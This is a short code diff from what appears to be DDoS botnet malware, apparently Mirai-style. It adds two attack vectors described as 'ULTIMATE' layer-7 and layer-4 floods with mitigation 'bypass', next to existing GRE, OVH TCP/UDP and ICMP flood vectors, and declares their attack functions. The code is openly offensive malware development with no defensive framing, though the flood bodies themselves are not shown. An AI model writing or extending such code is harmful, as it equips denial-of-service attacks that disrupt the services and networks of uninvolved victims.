@@ -16,8 +16,10 @@
 #define ATK_VEC_AXISL4      7   /* Combined OVHTCP + OVHUDP + ICMP */
 #define ATK_VEC_GREIP       8   /* GRE IP flood */
 #define ATK_VEC_GREETH      9   /* GRE Ethernet flood */
+#define ATK_VEC_ULTIMATE    10  /* ULTIMATE L7 - Advanced multi-layer bypass */
+#define ATK_VEC_ULTIMATEL4  11  /* ULTIMATE L4 - Combined volumetric + bypass */
 
-#define ATK_VEC_MAX         10
+#define ATK_VEC_MAX         12
 
 /* ============================================================================
  * ATTACK OPTIONS
@@ -76,6 +78,8 @@ static void attack_tcp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct
 static void attack_udp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_http_rps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_axis_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_ultimate_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_ultimate_l4(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_ovh_tcp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_ovh_udp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_icmp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
